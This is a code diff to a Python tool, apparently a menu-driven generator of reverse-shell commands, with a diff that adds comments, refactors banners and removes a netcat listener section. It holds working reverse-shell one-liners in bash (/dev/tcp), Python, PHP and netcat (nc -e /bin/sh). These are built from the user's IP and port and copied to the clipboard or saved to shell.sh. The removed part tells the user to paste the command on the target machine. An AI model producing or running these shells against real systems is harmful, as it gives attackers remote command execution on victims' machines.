@@ -8,10 +8,11 @@ import pyperclip
 from time import sleep
 from netifaces import interfaces, ifaddresses, AF_INET
 
-ipadd = "0.0.0.0"
-port = "0000"
-interf = "N/A"
+ipadd = "0.0.0.0" #Global variable for IP address
+port = "0000" #Global variable for port
+interf = "N/A" #Global variable for interface
 
+#Main function
 def main():
     banner = """   ________               __  _____ __              __     __________________
   / ____/ /_  ___  ____ _/ /_/ ___// /_  ___  ___  / /_   / ____/_  __/ ____/
@@ -34,37 +35,49 @@ def main():
     print("+-------------------------------------+")
     print("")
     print("[!] Local IP : " + ipadd)
-    print("[!] Interface : " + interf) 
+    print("[!] Interface : " + interf)
     choice = input('\n[*] Enter your choice : ')
-    match choice:
-        case '1':
+    match choice:                                                       #Match choice
+        case '1':                                                      #Create reverse shell
             revershell()
-        case '2':
+        case '2':                                                     #Netcat connection
             netcat()
-        case '3':
+        case '3':                                                    #Set interface IP
             setIp()
             backtomain()
 
+#Banner function
+def banner():
+    banner = """______                             _____ _          _ _
+| ___ \                           /  ___| |        | | |
+| |_/ /_____   _____ _ __ ___  ___\ `--.| |__   ___| | |
+|    // _ \ \ / / _ \ '__/ __|/ _ \`--. \ '_ \ / _ \ | |
+| |\ \  __/\ V /  __/ |  \__ \  __/\__/ / | | |  __/ | |
+\_| \_\___| \_/ \___|_|  |___/\___\____/|_| |_|\___|_|_|
+<------------------------------------------------------->
+"""
+    print(banner)
 
-
-
+#Get IP of interface function
 def getIp(interface):
     ipInt = ifaddresses(interface)[AF_INET][0]['addr']
     return ipInt
 
+#Set IP to global variable 'ipadd'
 def setIp():
     interface = input('[*] Enter your interface : ')
     getIp(interface)
     globals()['ipadd'] = getIp(interface)
     globals()['interf'] = interface
 
+#Go back to main menu function
 def backtomain():
     print('\n[*] Go back to main')
     sleep(1)
     os.system('clear')
     main()
 
-
+#The main function for reverse shells
 def revershell():
     os.system('clear')
     banner = """______                             _____ _          _ _ 
@@ -81,75 +94,60 @@ def revershell():
 - [6] Exit -
 <------------------------------------------------------->"""
     print(banner)
-    c_rs = input('\n[*] Enter your choice : ')
-    match c_rs:
-        case '1':
+    c_rs = input('\n[*] Enter your choice : ') #Choice for reverse shell
+    match c_rs:  #Match choice
+        case '1': #Bash reverse shell
             bash()
-        case '2':
+        case '2': #Python reverse shell
             python()
-        case '3':
+        case '3': #PHP reverse shell
             php()
-        case '4':
+        case '4': #Netcat reverse shell
             nc()
-        case '6':
+        case '6': #Exit
             backtomain()
 
+#Bash reverse shell function
 def bash():
     os.system('clear')
-    banner = """______                             _____ _          _ _
-| ___ \                           /  ___| |        | | |
-| |_/ /_____   _____ _ __ ___  ___\ `--.| |__   ___| | |
-|    // _ \ \ / / _ \ '__/ __|/ _ \`--. \ '_ \ / _ \ | |
-| |\ \  __/\ V /  __/ |  \__ \  __/\__/ / | | |  __/ | |
-\_| \_\___| \_/ \___|_|  |___/\___\____/|_| |_|\___|_|_|
-<------------------------------------------------------->
-[*] Welcome to the bash reverse shell
-"""
-    print(banner)
-    port1 = "1234"
-    if ipadd == "0.0.0.0":
+    banner()
+    port1 = "1234"                                                                  #Setup default port for reverse shell
+    if ipadd == "0.0.0.0":                                                          #Check if IP address and Interface  is set
         print("[!] You need to set your interface ip")
         setIp()
-        bash()
-    else:
+        bash()                                                                      #Callback bash function 
+    else:                                                                           #If IP address and Interface is set
         port = input('[*] Enter your port (Default : 1234) : ')
         if port == '':
-            port = port1
+            port = port1                                                            #If no port is entered, use default port
         else:
-            globals()['port'] = port
+            globals()['port'] = port                                                #If port is entered, set it to global variable
     print("\n[*] Your shell is creating...")
     sleep(1)
-    shell = 'bash -i >& /dev/tcp/' + ipadd + '/' + port + ' 0>&1'
+    shell = 'bash -i >& /dev/tcp/' + ipadd + '/' + port + ' 0>&1'                   #Create reverse shell command
     print("[*] Your shell is created")
-    choice = input('\n[*] Do you want to copy your shell to Clipboard or export as File ? (c/f) : ')
-    match choice:
-        case 'c':
-            pyperclip.copy(shell)
+    choice = input(
+        '\n[*] Do you want to copy your shell to Clipboard or export as File ? (c/f) : ')
+    match choice:                                                                   #Match choice
+        case 'c':                                                                   #Case C for copy to clipboard
+            pyperclip.copy(shell)                                                   #Copy reverse shell command to clipboard
             print("\n[*] Your shell is copied to Clipboard")
             sleep(1)
-            backtomain()
-        case 'f':
-            file = "shell.sh"
-            with open(file, "w") as f:
-                f.write(shell)
+            backtomain()                                                            #Go back to main menu
+        case 'f':                                                                   #Case F for export as file
+            file = "shell.sh"                                                       #Create file name
+            with open(file, "w") as f:                                              #Open file and write reverse shell command
+                f.write(shell)                                                      #Write reverse shell command to file
             print("\n[*] Your shell is exported as " + file)
             sleep(1)
             backtomain()
 
-def python():
-    os.system('clear')
-    banner = """______                             _____ _          _ _
-| ___ \                           /  ___| |        | | |
-| |_/ /_____   _____ _ __ ___  ___\ `--.| |__   ___| | |
-|    // _ \ \ / / _ \ '__/ __|/ _ \`--. \ '_ \ / _ \ | |
-| |\ \  __/\ V /  __/ |  \__ \  __/\__/ / | | |  __/ | |
-\_| \_\___| \_/ \___|_|  |___/\___\____/|_| |_|\___|_|_|
-<------------------------------------------------------->
-[*] Welcome to the python reverse shell
-"""
-    print(banner)
+
+def python():                                                                       #Python reverse shell function
+    os.system('clear')                                                              #Its the same code as bash reverse shell function
+    banner()
     port1 = "1234"
-    if ipadd == "0.0.0.0":
+    if ipadd == "0.0.0.0":                                                         
         print("[!] You need to set your interface ip")
         setIp()
         python()
@@ -161,9 +159,12 @@ def python():
             globals()['port'] = port
     print("\n[*] Your shell is creating...")
     sleep(1)
-    shell = 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("' + ipadd + '",' + port + '));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''
+    shell = 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("' + ipadd + \
+        '",' + port + \
+            '));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''
     print("[*] Your shell is created")
-    choice = input('\n[*] Do you want to copy your shell to Clipboard or export as File ? (c/f) : ')
+    choice = input(
+        '\n[*] Do you want to copy your shell to Clipboard or export as File ? (c/f) : ')
     match choice:
         case 'c':
             pyperclip.copy(shell)
@@ -178,18 +179,10 @@ def python():
             sleep(1)
             backtomain()
 
-def php():
-    os.system('clear')
-    banner = """______                             _____ _          _ _
-| ___ \                           /  ___| |        | | |
-| |_/ /_____   _____ _ __ ___  ___\ `--.| |__   ___| | |
-|    // _ \ \ / / _ \ '__/ __|/ _ \`--. \ '_ \ / _ \ | |
-| |\ \  __/\ V /  __/ |  \__ \  __/\__/ / | | |  __/ | |
-\_| \_\___| \_/ \___|_|  |___/\___\____/|_| |_|\___|_|_|
-<------------------------------------------------------->
-[*] Welcome to the php reverse shell
-"""
-    print(banner)
+
+def php():                                                                         #PHP reverse shell function
+    os.system('clear')                                                            #Its the same code as bash reverse shell function
+    banner()
     port1 = "1234"
     if ipadd == "0.0.0.0":
         print("[!] You need to set your interface ip")
@@ -203,9 +196,11 @@ def php():
             globals()['port'] = port
     print("\n[*] Your shell is creating...")
     sleep(1)
-    shell = "php -r '$sock=fsockopen(" + ipadd + "," + port+");exec('/bin/sh -i <&3 >&3 2>&3');'"
+    shell = "php -r '$sock=fsockopen(" + ipadd + \
+        "," + port+");exec('/bin/sh -i <&3 >&3 2>&3');'"
     print("[*] Your shell is created")
-    choice = input('\n[*] Do you want to copy your shell to Clipboard or export as File ? (c/f) : ')
+    choice = input(
+        '\n[*] Do you want to copy your shell to Clipboard or export as File ? (c/f) : ')
     match choice:
         case 'c':
             pyperclip.copy(shell)
@@ -220,18 +215,10 @@ def php():
             sleep(1)
             backtomain()
 
-def nc():
-    os.system('clear')
-    banner = """______                             _____ _          _ _
-| ___ \                           /  ___| |        | | |
-| |_/ /_____   _____ _ __ ___  ___\ `--.| |__   ___| | |
-|    // _ \ \ / / _ \ '__/ __|/ _ \`--. \ '_ \ / _ \ | |
-| |\ \  __/\ V /  __/ |  \__ \  __/\__/ / | | |  __/ | |
-\_| \_\___| \_/ \___|_|  |___/\___\____/|_| |_|\___|_|_|
-<------------------------------------------------------->
-[*] Welcome to the netcat reverse shell
-"""
-    print(banner)
+
+def nc():                                                                         #Netcat reverse shell function
+    os.system('clear')                                                           #Its the same code as bash reverse shell function
+    banner()
     port1 = "1234"
     if ipadd == "0.0.0.0":
         print("[!] You need to set your interface ip")
@@ -247,7 +234,8 @@ def nc():
     sleep(1)
     shell = "nc -e /bin/sh " + ipadd + " " + port
     print("[*] Your shell is created")
-    choice = input('\n[*] Do you want to copy your shell to Clipboard or export as File ? (c/f) : ')
+    choice = input(
+        '\n[*] Do you want to copy your shell to Clipboard or export as File ? (c/f) : ')
     match choice:
         case 'c':
             pyperclip.copy(shell)
@@ -262,6 +250,7 @@ def nc():
             sleep(1)
             backtomain()
 
+
 def netcat():
     os.system('clear')
     banner = """
@@ -273,35 +262,6 @@ def netcat():
 ╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚═════╝╚═╝  ╚═╝   ╚═╝  
 <------------------------------------------------------->"""
     print(banner)
-    ip = input('[*] Enter your IP : ')
-    port = str(input('[*] Enter your port (default: 1234) : '))
-    if port == '':
-        port = '1234'
-        print('[*] Using default port : 1234')
-        print('----')
-        print('[!] Copying the command to clipboard : nc -e /bin/sh ' + ip + ' ' + port)
-        print('[!] Paste this command in the target machine')
-        print('----')
-        sleep(1)
-        print('[*] Starting netcat reverse shell')
-        sleep(1)
-        print('[*] Waiting for connection')
-        print('----')
-        shell = "nc -lvnp " + ip + " " + port
-        pyperclip.copy('nc -e /bin/sh '+ip+' '+port)
-        os.system(shell)
-    else:
-        print('----')
-        print('[!] Copying the command to clipboard : nc -e /bin/sh ' + ip + ' ' + port)
-        print('[!] Paste this command in the target machine')
-        print('----')
-        sleep(1)
-        print('[*] Starting netcat reverse shell')
-        sleep(1)
-        print('[*] Waiting for connection')
-        print('----')
-        shell = "nc -lvnp " + ip + " " + port
-        pyperclip.copy('nc -e /bin/sh '+ip+' '+port)
-        os.system(shell)
+
 
 main()
